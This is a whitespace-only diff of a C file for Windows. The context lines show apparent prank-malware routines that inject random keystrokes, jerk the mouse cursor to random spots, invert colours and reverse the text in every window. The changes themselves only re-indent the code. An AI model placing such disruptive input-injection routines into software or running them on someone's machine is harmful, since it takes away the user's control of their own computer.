@@ -14,8 +14,8 @@ void shell_execute(window_t* w)
 void keyboard_malfunction(window_t* w)
 {
     INPUT input;
-	input.type = INPUT_KEYBOARD;
-	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
+    input.type = INPUT_KEYBOARD;
+    input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
 
     SendInput(1, &input, sizeof(INPUT));
     printf("keyboard_malfunction\n");
@@ -24,7 +24,7 @@ void keyboard_malfunction(window_t* w)
 void cursor_malfunction(window_t* w)
 {
     POINT cursor;
-	GetCursorPos(&cursor);
+    GetCursorPos(&cursor);
 
     SetCursorPos(
         cursor.x + (random() % 3 - 1) * (random() % 1000),
@@ -41,17 +41,17 @@ void invert_colors(window_t* w)
 
 static BOOL CALLBACK enum_child_proc(HWND hwnd, LPARAM lParam)
 {
-	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
+    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
 
-	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL))
+    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL))
     {
-		reverse_string_w(str);
-		SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
-	}
-	
-	GlobalFree(str);
+        reverse_string_w(str);
+        SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
+    }
 
-	return TRUE;
+    GlobalFree(str);
+
+    return TRUE;
 }
 
 void invert_text(window_t* w)
